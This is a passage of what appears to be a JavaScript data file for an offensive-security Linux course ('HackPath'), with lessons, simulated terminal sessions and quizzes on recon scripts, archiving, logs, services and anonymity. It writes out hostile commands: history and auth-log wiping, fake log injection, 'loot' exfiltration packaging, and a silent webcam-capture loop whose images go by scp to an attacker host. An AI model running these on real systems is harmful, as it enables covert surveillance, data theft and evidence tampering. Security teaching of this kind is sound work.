      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat full_recon.sh")+"<br>"+O("#!/bin/bash<br>TARGET=$1<br><br>banner() {<br>    echo '=========================================='<br>    echo \"  HackPath Recon v1.0 ‚Äî Target: $1\"<br>    echo '=========================================='; }<br><br>port_scan() {<br>    echo '[*] Running nmap...'<br>    nmap -sV -sC --min-rate=1000 $1 2>/dev/null<br>    echo '[+] Port scan complete'; }<br><br>dir_enum() {<br>    echo '[*] Enumerating web directories...'<br>    gobuster dir -u http://$1 -w /opt/SecLists/Discovery/Web-Content/common.txt -q<br>    echo '[+] Dir enum complete'; }<br><br>main() {<br>    banner $TARGET<br>    port_scan $TARGET<br>    dir_enum $TARGET; }<br><br>main")+"<br>"+P("./full_recon.sh 192.168.1.50")+"<br>"+GR("==========================================<br>  HackPath Recon v1.0 ‚Äî Target: 192.168.1.50<br>==========================================<br>[*] Running nmap..."))}`
    },
    {
      name:"Build a Port Scanner from Scratch",
      content:`<p>Now we build a complete, professional port scanner using only bash ‚Äî no nmap. This demonstrates deep understanding of TCP connections and shell scripting, and is useful when nmap isn't available on a target.</p>
      <h3>The Full Port Scanner</h3>
      ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat port_scanner.sh")+"<br>"+O("#!/bin/bash<br># ============================================<br># HackPath Port Scanner ‚Äî Pure Bash Edition<br># Usage: ./port_scanner.sh <IP> [start_port] [end_port]<br># ============================================<br>set -uo pipefail<br><br>TARGET=${1:-'127.0.0.1'}<br>START=${2:-1}<br>END=${3:-1024}<br>TIMEOUT=0.5<br>OPEN_PORTS=()<br><br>banner() {<br>    echo \"\"<br>    echo \"  ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\"<br>    echo \"  ‚ïë  HACKPATH PORT SCANNER v1.0     ‚ïë\"<br>    echo \"  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\"<br>    echo \"  Target : $TARGET\"<br>    echo \"  Range  : $START - $END\"<br>    echo \"  Started: $(date)\"<br>    echo \"\"; }<br><br>scan_port() {<br>    local port=$1<br>    timeout $TIMEOUT bash -c \"echo >/dev/tcp/$TARGET/$port\" 2>/dev/null<br>    return $?; }<br><br>banner<br>echo \"[*] Scanning...\"<br>for port in $(seq $START $END); do<br>    if scan_port $port; then<br>        OPEN_PORTS+=($port)<br>        printf \"  [OPEN] Port %-6d\\n\" $port<br>    fi<br>done<br>echo \"\"<br>echo \"[+] Scan complete. ${#OPEN_PORTS[@]} open ports found.\"<br>echo \"[+] Open: ${OPEN_PORTS[*]}\"")+"<br>"+P("chmod +x port_scanner.sh && ./port_scanner.sh 192.168.1.50 1 1024")+"<br>"+GR("  ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó<br>  ‚ïë  HACKPATH PORT SCANNER v1.0     ‚ïë<br>  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù<br>  Target : 192.168.1.50<br>  Range  : 1 - 1024<br>  Started: Wed Jan 15 09:18:33<br><br>[*] Scanning...<br>  [OPEN] Port 22<br>  [OPEN] Port 80<br>  [OPEN] Port 3306<br><br>[+] Scan complete. 3 open ports found.<br>[+] Open: 22 80 3306"))}`
    }
  ],
  quiz:[
    {q:"What does 'set -euo pipefail' do in a bash script?",opts:["Sets exit code","Enables strict error handling","Sets user options","Starts a subshell"],ans:1},
    {q:"How do you call a bash function named 'scan'?",opts:["call scan","function scan","scan","invoke scan"],ans:2},
    {q:"/dev/tcp/host/port is used for:",opts:["Creating device files","Bash TCP connections without nc","Setting TCP timeouts","Port binding"],ans:1}
  ]
},
{
  num:9, title:"Compression & Archiving", icon:"üóúÔ∏è",
  desc:"Master tar, gzip, zip, and 7z for evidence packaging, data exfiltration, and tool staging.",
  xp:20,
  lessons:[
    {name:"tar ‚Äî The Tape Archiver",content:`<p>tar is the standard Unix archiving tool. It bundles multiple files and directories into a single archive ‚Äî preserving permissions, ownership, and timestamps. Essential for packaging tools, exfiltrating data, and creating system backups during pentests.</p>
    <h3>Core tar Syntax</h3>
    <table><tr><th>Flag</th><th>Meaning</th></tr><tr><td>c</td><td>Create archive</td></tr><tr><td>x</td><td>Extract archive</td></tr><tr><td>v</td><td>Verbose output</td></tr><tr><td>f</td><td>Specify filename</td></tr><tr><td>z</td><td>Compress with gzip</td></tr><tr><td>j</td><td>Compress with bzip2</td></tr><tr><td>J</td><td>Compress with xz</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("tar -cvzf loot.tar.gz /tmp/collected/")+"<br>"+O("collected/<br>collected/passwords.txt<br>collected/hashes.db<br>collected/ssh_keys/"))}
    ${INFO("PRESERVE PERMISSIONS","Use <code>tar --preserve-permissions -cvzf</code> to maintain exact file permissions when archiving and restoring on another system.")}`},
    {name:"gzip, bzip2 & xz ‚Äî Compression Tools",content:`<p>Compression reduces file size for faster transfer during exfiltration. Different algorithms offer different tradeoffs between speed and compression ratio.</p>
    <table><tr><th>Tool</th><th>Extension</th><th>Speed</th><th>Ratio</th><th>Use Case</th></tr><tr><td>gzip</td><td>.gz</td><td>Fast</td><td>Good</td><td>General use</td></tr><tr><td>bzip2</td><td>.bz2</td><td>Medium</td><td>Better</td><td>Better compression needed</td></tr><tr><td>xz</td><td>.xz</td><td>Slow</td><td>Best</td><td>Maximum compression</td></tr><tr><td>7z</td><td>.7z</td><td>Medium</td><td>Best</td><td>Cross-platform, encryption</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("gzip -9 passwords.txt")+"<br>"+O("passwords.txt ‚Üí passwords.txt.gz (73% reduction)")+"<br>"+P("bzip2 -k large_dump.sql")+"<br>"+O("large_dump.sql ‚Üí large_dump.sql.bz2 (81% reduction)")+"<br>"+P("7z a -p'S3cr3tPass!' -mhe=on encrypted.7z /tmp/loot/")+"<br>"+O("7-Zip: Adding files to encrypted.7z<br>Everything is Ok")+"<br>"+COM("# -p = password, -mhe = encrypt headers too"))}`},
    {name:"Extracting & Verifying Archives",content:`<p>You'll regularly receive archives during CTFs and find them on target systems. Knowing how to extract any format quickly is essential.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("file unknown_archive")+"<br>"+O("unknown_archive: gzip compressed data, was 'backup.tar'")+"<br>"+P("tar -xvzf backup.tar.gz -C /tmp/extracted/")+"<br>"+O("backup/<br>backup/web.conf<br>backup/db_creds.txt")+"<br>"+COM("# Found database credentials!")+"<br>"+P("unzip archive.zip -d /tmp/unzipped/")+"<br>"+P("7z x encrypted.7z")+"<br>"+O("Enter password: ***<br>Everything is Ok"))}
    ${TIP("CTF TIP","In CTFs, archives are often hidden in images (steganography). Use <code>steghide extract -sf image.jpg</code> or run <code>binwalk -e image.png</code> to find embedded files.")}`},
    {name:"Archiving for Data Exfiltration",content:`<p>During authorized pentests, collected evidence and loot needs to be packaged carefully. Proper archiving maintains evidence integrity and makes post-engagement reporting easier.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat exfil_package.sh")+"<br>"+O("#!/bin/bash<br>DATE=$(date +%Y%m%d_%H%M)<br>TARGET='192.168.1.50'<br>OUTFILE=\"engagement_${TARGET}_${DATE}.tar.gz.enc\"<br><br>tar -czf - /tmp/loot/ | \\<br>  openssl enc -aes-256-cbc -salt -pass pass:S3cr3t! | \\<br>  base64 > $OUTFILE<br>  <br>echo \"[+] Encrypted archive: $OUTFILE\"<br>echo \"[+] SHA256: $(sha256sum $OUTFILE)\"")+"<br>"+P("./exfil_package.sh")+"<br>"+GR("[+] Encrypted archive: engagement_192.168.1.50_20250115_0918.tar.gz.enc<br>[+] SHA256: a3f8b2c1..."))}`},
    {name:"dd ‚Äî Block-Level Copying",content:`<p><code>dd</code> copies data at the block level ‚Äî bit for bit. It creates forensic disk images, wipes drives securely, and generates random data. Used by forensic investigators and attackers alike.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("dd if=/dev/sdb of=/mnt/external/forensic_image.img bs=4M status=progress")+"<br>"+O("2147483648 bytes (2.1 GB, 2.0 GiB) copied, 45 s, 47.7 MB/s")+"<br>"+P("dd if=/dev/urandom of=/dev/sdb bs=4M status=progress")+"<br>"+COM("# Securely wipe drive with random data")+"<br>"+P("dd if=/dev/zero of=10mb_file.bin bs=1M count=10")+"<br>"+COM("# Create a specific-size file (useful for testing)"))}
    ${DANGER("NEVER SWAP if= AND of=","dd with swapped input/output WILL destroy your hard drive with no confirmation, no undo, and no recovery. Double-check every dd command before pressing Enter. This is why dd is nicknamed 'Disk Destroyer'.")}`}
  ],
  quiz:[
    {q:"What does 'tar -xvzf archive.tar.gz' do?",opts:["Create archive","Extract gzip-compressed archive verbosely","Encrypt archive","Test archive integrity"],ans:1},
    {q:"Which dd argument specifies the input device?",opts:["of=","if=","bs=","count="],ans:1},
    {q:"7z -mhe=on does what?",opts:["Sets max compression","Encrypts file headers as well as content","Sets high encryption","Enables header-only encryption"],ans:1}
  ]
},
{
  num:10, title:"Filesystem & Storage", icon:"üíæ",
  desc:"Manage filesystems, mount drives, analyze disk usage, and perform forensic file operations.",
  xp:20,
  lessons:[
    {name:"Linux Filesystem Types",content:`<p>Understanding filesystem types helps you identify what OS and configuration a target uses, and determines what tools you need for forensic analysis or exploitation.</p>
    <table><tr><th>Filesystem</th><th>OS</th><th>Max File Size</th><th>Notes</th></tr><tr><td>ext4</td><td>Linux default</td><td>16TB</td><td>Most common Linux FS</td></tr><tr><td>NTFS</td><td>Windows</td><td>256TB</td><td>ADS for hiding data</td></tr><tr><td>FAT32</td><td>Universal</td><td>4GB</td><td>USB drives</td></tr><tr><td>XFS</td><td>RHEL/CentOS</td><td>8EB</td><td>High performance</td></tr><tr><td>Btrfs</td><td>Modern Linux</td><td>16EB</td><td>Snapshots, subvolumes</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("lsblk")+"<br>"+O("NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS<br>sda      8:0    0   50G  0 disk<br>‚îú‚îÄsda1   8:1    0   49G  0 part /<br>‚îî‚îÄsda2   8:2    0    1G  0 part [SWAP]<br>sdb      8:16   0  500G  0 disk<br>‚îî‚îÄsdb1   8:17   0  500G  0 part")+"<br>"+P("blkid")+"<br>"+O("/dev/sda1: UUID=abc123 TYPE=ext4<br>/dev/sdb1: UUID=def456 TYPE=ntfs"))}`},
    {name:"Mounting & Managing Drives",content:`<p>Mounting makes a filesystem accessible within the Linux directory tree. Forensic investigators mount suspect drives read-only; attackers mount network shares to access files.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("mkdir -p /mnt/evidence")+"<br>"+P("mount -o ro /dev/sdb1 /mnt/evidence")+"<br>"+COM("# -o ro = read-only mount ‚Äî preserves evidence integrity")+"<br>"+P("mount -t ntfs-3g /dev/sdb1 /mnt/windows -o ro")+"<br>"+COM("# Mount NTFS (Windows) drive")+"<br>"+P("mount -t cifs //192.168.1.10/share /mnt/smb -o user=admin,password=pass")+"<br>"+COM("# Mount Windows SMB share")+"<br>"+P("umount /mnt/evidence")+"<br>"+COM("# Safely unmount when done"))}`},
    {name:"Disk Usage Analysis",content:`<p>Knowing what's consuming disk space is critical for maintaining operational systems and for post-compromise analysis ‚Äî huge directories may indicate collected data, logs, or cryptomining.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("df -h")+"<br>"+O("Filesystem      Size  Used Avail Use% Mounted on<br>/dev/sda1        50G   38G   10G  79% /<br>/tmp             3.9G  2.8G  1.1G  73% /tmp")+"<br>"+COM("# /tmp is 73% full ‚Äî unusual, investigate!")+"<br>"+P("du -sh /* 2>/dev/null | sort -rh | head -10")+"<br>"+O("12G  /var<br>8.4G /home<br>3.1G /tmp<br>2.2G /usr")+"<br>"+P("du -sh /tmp/* | sort -rh | head -5")+"<br>"+GR("2.8G /tmp/.hidden_loot<br>12M  /tmp/linpeas.sh")+"<br>"+COM("# Hidden directory consuming 2.8GB ‚Äî found it"))}`},
    {name:"File Metadata & Forensics",content:`<p>Every file has metadata ‚Äî creation time, modification time, access time, owner, inode number. Forensic investigators and attackers both care deeply about this information.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("stat /etc/passwd")+"<br>"+O("  File: /etc/passwd<br>  Size: 2847<br>Access: (0644/-rw-r--r--)  Uid: (0/root)  Gid: (0/root)<br>Access: 2025-01-15 09:15:44.123456789<br>Modify: 2025-01-10 14:22:31.000000000<br>Change: 2025-01-10 14:22:31.000000000<br> Birth: 2025-01-08 12:00:00.000000000")+"<br>"+COM("# Modification time changed Jan 10 ‚Äî was it tampered?")+"<br>"+P("file /tmp/suspicious_binary")+"<br>"+O("/tmp/suspicious_binary: ELF 64-bit LSB executable, x86-64, dynamically linked<br>Stripped")+"<br>"+COM("# Stripped = debug symbols removed ‚Äî trying to hide purpose"))}
    ${INFO("TIMESTAMP MANIPULATION","Attackers cover tracks by timestomping: <code>touch -t 202001010000 file</code> changes access/modify times. <code>stat</code> still shows the 'Change' time which is harder to fake.")}`},
    {name:"Finding Hidden Data in the Filesystem",content:`<p>Data can be hidden in filesystems in many ways: hidden directories, alternate data streams (NTFS), slack space, and steganography. Learning to find it is essential for both offense and forensics.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ls -la /home/alice/")+"<br>"+O("total 36<br>-rw-r--r--  1 alice alice  220 Jan 10 .bash_logout<br>drwxr-xr-x  2 alice alice 4096 Jan 10 .ssh<br>-rw-------  1 alice alice  741 Jan 10 .hidden_notes")+"<br>"+COM("# . prefix = hidden file in Linux")+"<br>"+P("find / -name '.*' -type f 2>/dev/null | head -10")+"<br>"+GR("/root/.bash_history<br>/home/alice/.hidden_notes<br>/tmp/.htaccess")+"<br>"+P("cat /home/alice/.bash_history")+"<br>"+GR("ssh admin@10.10.10.1<br>mysql -u root -p'DatabaseP@ss!'<br>curl http://internal.corp/api?token=abc123"))}`}
  ],
  quiz:[
    {q:"Which mount option mounts a drive read-only?",opts:["-o readonly","-o ro","-r","-readonly"],ans:1},
    {q:"stat command shows:",opts:["Statistical data only","File metadata including timestamps","Storage statistics","System status"],ans:1},
    {q:"Hidden files in Linux start with:",opts:["_",".","~","#"],ans:1}
  ]
},
{
  num:11, title:"Logging & Covering Tracks", icon:"üìã",
  desc:"Master Linux logging, extract intelligence from logs, and learn how attackers cover their tracks.",
  xp:30,
  lessons:[
    {name:"The Linux Logging System",content:`<p>Linux logging is a multi-layered system. The kernel logs hardware events. systemd-journald captures service messages. rsyslog routes logs to files. Understanding this architecture lets you extract intelligence and understand what evidence a compromise leaves behind.</p>
    <h3>Log Hierarchy</h3>
    <table><tr><th>Log File</th><th>Contents</th><th>Hacker Interest</th></tr><tr><td>/var/log/auth.log</td><td>Authentication events</td><td>SSH logins, sudo usage, failed auth</td></tr><tr><td>/var/log/syslog</td><td>General system messages</td><td>Service starts, kernel messages</td></tr><tr><td>/var/log/apache2/access.log</td><td>Web requests</td><td>What pages were visited, from where</td></tr><tr><td>/var/log/mysql/error.log</td><td>DB errors</td><td>SQL injection attempts visible here</td></tr><tr><td>/var/log/kern.log</td><td>Kernel messages</td><td>Hardware events, module loads</td></tr><tr><td>/root/.bash_history</td><td>Command history</td><td>What root has been doing</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("journalctl -xe --since '1 hour ago'")+"<br>"+O("Jan 15 09:00:01 kali sshd[5421]: Accepted publickey for alice<br>Jan 15 09:14:55 kali sudo[5890]: alice : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash<br>Jan 15 09:15:02 kali sudo[5891]: root : TTY=pts/0 ; COMMAND=/bin/bash"))}`},
    {name:"Extracting Intelligence from Logs",content:`<p>Logs tell the story of a compromise ‚Äî when it happened, from where, what was accessed. Being able to rapidly parse logs is essential for incident response and for understanding what evidence you leave during a pentest.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("grep 'Accepted' /var/log/auth.log | awk '{print $1,$2,$3,$9,$11}' | sort")+"<br>"+O("Jan 15 08:21 alice 192.168.1.42<br>Jan 15 09:14 root 10.0.0.5")+"<br>"+COM("# Successful SSH logins: time, user, source IP")+"<br>"+P("grep 'Failed' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head")+"<br>"+GR("  847 192.168.1.105<br>   42 10.0.0.99")+"<br>"+COM("# Brute force source IPs ranked by attempt count")+"<br>"+P("awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -5")+"<br>"+O("  3421 192.168.1.50<br>   892 10.0.0.1")+"<br>"+COM("# Top clients hitting web server ‚Äî spot scanners, spiders, attackers"))}`},
    {name:"rsyslog Configuration",content:`<p>rsyslog is the logging daemon that routes messages to files. Understanding its configuration lets you redirect, filter, or silence logging ‚Äî a technique used both in hardening and in post-exploitation.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat /etc/rsyslog.conf | grep -v '^#' | grep -v '^$'")+"<br>"+O("module(load=\"imuxsock\")<br>module(load=\"imklog\")<br>auth,authpriv.*           /var/log/auth.log<br>*.*;auth,authpriv.none    /var/log/syslog<br>kern.*                    -/var/log/kern.log")+"<br>"+COM("# auth.* ‚Üí auth.log; everything else ‚Üí syslog")+"<br>"+P("logger -t hackpath 'Custom log message injected'")+"<br>"+P("grep hackpath /var/log/syslog")+"<br>"+GR("Jan 15 09:30:01 kali hackpath: Custom log message injected")+"<br>"+COM("# You can inject custom entries ‚Äî useful for framing and confusion"))}`},
    {name:"Covering Your Tracks",content:`<p>After an authorized pentest, or in a red team scenario, you may need to clean up evidence. Understanding log cleanup is also critical for blue teamers who need to detect when it's happening.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("history -c && history -w")+"<br>"+COM("# Clear bash history in memory and write empty to file")+"<br>"+P("export HISTFILE=/dev/null")+"<br>"+COM("# Future commands won't be logged to history")+"<br>"+P("export HISTSIZE=0 HISTFILESIZE=0")+"<br>"+COM("# Zero size history ‚Äî nothing gets saved")+"<br>"+P("cat /dev/null > /var/log/auth.log")+"<br>"+COM("# Truncate auth log (requires root) ‚Äî aggressive, leaves evidence of tampering")+"<br>"+P("sed -i '/10.10.14.5/d' /var/log/auth.log")+"<br>"+COM("# Surgical removal ‚Äî delete only our IP from logs"))}`},
    {name:"Log Monitoring for Defense",content:`<p>Understanding logging from a defensive perspective makes you a better attacker. When you know what defenders see, you can operate more stealthily. This knowledge is also essential for building detection capabilities.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("tail -f /var/log/auth.log | grep --line-buffered 'Failed' | awk '{print $11}' | while read IP; do echo \"ALERT: Brute force from $IP\"; done")+"<br>"+GR("ALERT: Brute force from 192.168.1.105<br>ALERT: Brute force from 192.168.1.105<br>ALERT: Brute force from 192.168.1.105")+"<br>"+COM("# Real-time brute force detector in one line of bash!")+"<br>"+P("ausearch -k execve --start today | grep -E 'nc|ncat|python|perl'")+"<br>"+COM("# auditd: search for suspicious command execution today"))}`}
  ],
  quiz:[
    {q:"Which log file records SSH authentication events?",opts:["/var/log/syslog","/var/log/auth.log","/var/log/secure","/var/log/ssh"],ans:1},
    {q:"'history -c && history -w' does what?",opts:["Clears screen","Clears and writes empty bash history","Shows history count","Writes history to file"],ans:1},
    {q:"'export HISTFILE=/dev/null' means:",opts:["History saved to null device","History disabled ‚Äî commands won't be logged","History written to /dev","Null history mode"],ans:1}
  ]
},
{
  num:12, title:"Linux Services: Apache, SSH & MySQL", icon:"üåç",
  desc:"Configure and exploit Apache, SSH tunneling, MySQL ‚Äî and learn how attackers abuse each service.",
  xp:35,
  lessons:[
    {name:"Apache Web Server Deep Dive",content:`<p>Apache serves over 30% of the internet's websites. As a hacker, you'll encounter it constantly. Understanding its configuration reveals vulnerabilities; misconfigured Apache installations are goldmines.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install apache2 -y && systemctl start apache2")+"<br>"+P("cat /etc/apache2/apache2.conf | grep -v '#' | grep -v '^$'")+"<br>"+O("ServerRoot /etc/apache2<br>Mutex default<br>User www-data<br>Group www-data<br>ErrorLog ${APACHE_LOG_DIR}/error.log<br>LogLevel warn")+"<br>"+P("a2enmod rewrite ssl headers && systemctl restart apache2")+"<br>"+COM("# Enable common modules: URL rewriting, SSL, security headers")+"<br>"+P("cat /etc/apache2/sites-enabled/000-default.conf")+"<br>"+O("&lt;VirtualHost *:80&gt;<br>  ServerAdmin webmaster@localhost<br>  DocumentRoot /var/www/html<br>  ErrorLog logs/error.log<br>&lt;/VirtualHost&gt;"))}
    ${INFO("MISCONFIGURATION HUNT","Check for: directory listing enabled (Options +Indexes), sensitive files accessible (.git, .env, backup.sql), PHP execution in upload directories, and ServerSignature exposing version information.")}`},
    {name:"OpenSSH ‚Äî Configuration & Hardening",content:`<p>SSH is the primary remote access protocol for Linux. Hackers exploit it (weak passwords, key theft) and use it (tunneling, pivoting). Understanding sshd_config deeply is essential for both offense and defense.</p>
    <h3>Critical sshd_config Settings</h3>
    <table><tr><th>Setting</th><th>Secure Value</th><th>What it does</th></tr><tr><td>PermitRootLogin</td><td>prohibit-password</td><td>Disables root password login</td></tr><tr><td>PasswordAuthentication</td><td>no</td><td>Keys only ‚Äî stops brute force</td></tr><tr><td>MaxAuthTries</td><td>3</td><td>Limits login attempts</td></tr><tr><td>AllowUsers</td><td>specific users</td><td>Whitelist users who can SSH</td></tr><tr><td>Port</td><td>non-standard</td><td>Reduces scan noise (security by obscurity)</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ssh-keygen -t ed25519 -C 'hackpath-key' -f ~/.ssh/id_ed25519")+"<br>"+O("Generating public/private ed25519 key pair.<br>Your identification has been saved in /root/.ssh/id_ed25519<br>Your public key has been saved in /root/.ssh/id_ed25519.pub")+"<br>"+P("ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@192.168.1.50")+"<br>"+O("alice@192.168.1.50's password:<br>Number of key(s) added: 1"))}`},
    {name:"SSH Tunneling & Port Forwarding",content:`<p>SSH tunneling is one of the most powerful pivoting techniques. It routes traffic through an SSH connection, bypassing firewalls and NAT ‚Äî allowing access to internal networks through a single compromised host.</p>
    <h3>Three Types of SSH Tunneling</h3>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",COM("# LOCAL FORWARDING: access remote service locally")+"<br>"+P("ssh -L 8080:internal-db:3306 alice@jump-server.com")+"<br>"+COM("# Now mysql -h 127.0.0.1 -P 8080 connects to internal-db:3306")+"<br>"+COM("")+"<br>"+COM("# REMOTE FORWARDING: expose local service to remote server")+"<br>"+P("ssh -R 9090:localhost:80 alice@vps.attacker.com")+"<br>"+COM("# Anyone hitting vps.attacker.com:9090 hits our local port 80")+"<br>"+COM("")+"<br>"+COM("# DYNAMIC FORWARDING: SOCKS proxy through SSH")+"<br>"+P("ssh -D 1080 alice@jump-server.com")+"<br>"+COM("# Configure proxychains to use 127.0.0.1:1080")+"<br>"+P("proxychains nmap -sT 10.0.0.0/24")+"<br>"+GR("# Scanning internal network through SSH pivot!"))}`},
    {name:"MySQL ‚Äî Database Hacking",content:`<p>MySQL is the world's most popular open-source database. Misconfigured MySQL installations expose credentials, sensitive data, and sometimes allow command execution. SQL injection remains one of the most common web vulnerabilities.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("mysql -u root -h 192.168.1.50 -p")+"<br>"+O("Enter password: <br>Welcome to the MySQL monitor.<br>mysql>")+"<br>"+O("mysql> SHOW DATABASES;")+"<br>"+GR("+--------------------+<br>| Database           |<br>+--------------------+<br>| wordpress          |<br>| employees          |<br>| information_schema |<br>+--------------------+")+"<br>"+O("mysql> USE wordpress; SELECT user_login, user_pass FROM wp_users;")+"<br>"+GR("+------------+------------------------------------+<br>| admin      | $P$BFg.qj8Ndr/Nk7u2Oa.pBWu7eRFaE1 |<br>+------------+------------------------------------+")+"<br>"+COM("# WordPress password hash ‚Äî crack with hashcat: hashcat -m 400 hash.txt wordlist.txt"))}`},
    {name:"Building a Remote Video Spy",content:`<p>This advanced exercise combines multiple concepts: SSH, process management, and Linux device files. We build a remote video capture tool ‚Äî demonstrating how attackers can silently activate cameras on compromised systems.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install fswebcam ffmpeg -y")+"<br>"+COM("# Capture single frame:")+"<br>"+P("fswebcam -r 1280x720 --no-banner /tmp/frame_$(date +%s).jpg")+"<br>"+O("Captured frame from /dev/video0")+"<br>"+COM("# Continuous capture loop ‚Äî runs silently in background:")+"<br>"+P("nohup bash -c 'while true; do fswebcam -r 640x480 --no-banner /tmp/cap_$(date +%s).jpg 2>/dev/null; sleep 30; done' &")+"<br>"+O("[1] 7823")+"<br>"+COM("# nohup: survives terminal close; &: runs in background; sleep 30: capture every 30s")+"<br>"+COM("# Exfiltrate via SSH:")+"<br>"+P("scp /tmp/cap_*.jpg attacker@10.10.14.5:/collected/"))}
    ${WARN("AUTHORIZED USE ONLY","Camera surveillance without consent is illegal and unethical in virtually all jurisdictions. This exercise is for understanding the attack to defend against it ‚Äî and for authorized red team engagements only.")}`}
  ],
  quiz:[
    {q:"SSH -L 8080:target:3306 creates:",opts:["Remote port forward","Local port forward mapping local:8080 to target:3306","SOCKS proxy","VPN tunnel"],ans:1},
    {q:"Which MySQL command shows all databases?",opts:["LIST DATABASES","SHOW DATABASES","SELECT * FROM databases","ENUM DATABASES"],ans:1},
    {q:"nohup command & does what?",opts:["Runs command as root","Runs command immune to hangups in background","Sets no hangup mode","Nullifies output"],ans:1}
  ]
},
{
  num:13, title:"Security & Anonymity", icon:"üïµÔ∏è",
  desc:"Stay anonymous with Tor, VPNs, proxychains, and encrypted communications. Master operational security.",
  xp:30,
  lessons:[
    {name:"Proxy Servers & proxychains",content:`<p>Proxychains routes your TCP traffic through a chain of SOCKS or HTTP proxies, masking your origin IP. Every hop in the chain removes a layer of attribution ‚Äî critical for anonymity during authorized testing.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat /etc/proxychains4.conf | grep -v '^#' | grep -v '^$'")+"<br>"+O("dynamic_chain<br>proxy_dns<br>tcp_read_time_out 15000<br>tcp_connect_time_out 8000<br>[ProxyList]<br>socks5 127.0.0.1 9050  # Tor<br>socks4 10.10.14.1 1080  # VPN proxy")+"<br>"+P("proxychains4 -q curl ifconfig.me")+"<br>"+O("185.220.101.45")+"<br>"+COM("# Our real IP hidden! Shows Tor exit node IP"))}`},
    {name:"The Tor Network",content:`<p>Tor routes traffic through 3 randomly selected encrypted relays worldwide. It's the gold standard for anonymous communication, used by journalists, activists, researchers, and security professionals.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install tor -y && systemctl start tor")+"<br>"+O("Jan 15 09:00:01.000 [notice] Tor has successfully opened a circuit.")+"<br>"+P("curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip")+"<br>"+GR("{\"IsTor\":true,\"IP\":\"185.220.101.45\"}")+"<br>"+COM("# Confirmed: traffic routing through Tor")+"<br>"+P("service tor reload")+"<br>"+COM("# Reload to get a new circuit (new exit IP)")+"<br>"+P("proxychains nmap -sT -Pn 192.168.1.1")+"<br>"+COM("# nmap through Tor ‚Äî slower but anonymous; -sT required (no raw sockets through proxy)"))}
    ${INFO("TOR LIMITATIONS","Tor doesn't make you invisible ‚Äî it makes you harder to trace. Tor doesn't protect against: application-level leaks, JavaScript fingerprinting, timing attacks, or malicious exit nodes for unencrypted HTTP. Always use HTTPS through Tor.")}`},
    {name:"VPNs for Hackers",content:`<p>VPNs encrypt all traffic and route it through a trusted server, hiding your activity from your ISP and changing your apparent location. For security research, a no-log VPN adds an important anonymity layer.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install openvpn -y")+"<br>"+P("openvpn --config hackthebox.ovpn")+"<br>"+O("Thu Jan 15 09:00:01 2025 OpenVPN 2.6.3 x86_64-pc-linux-gnu<br>Thu Jan 15 09:00:04 2025 TUN/TAP device tun0 opened<br>Thu Jan 15 09:00:04 2025 Initialization Sequence Completed")+"<br>"+P("ip addr show tun0")+"<br>"+GR("5: tun0: &lt;POINTOPOINT,UP&gt; mtu 1500<br>    inet 10.10.14.5/23 scope global tun0")+"<br>"+COM("# HackTheBox VPN connected ‚Äî tun0 is our HTB interface"))}`},
    {name:"Encrypted Email & Communications",content:`<p>GPG (GNU Privacy Guard) provides end-to-end encryption for email and files. During authorized engagements, sensitive findings should always be communicated via encrypted channels.</p>
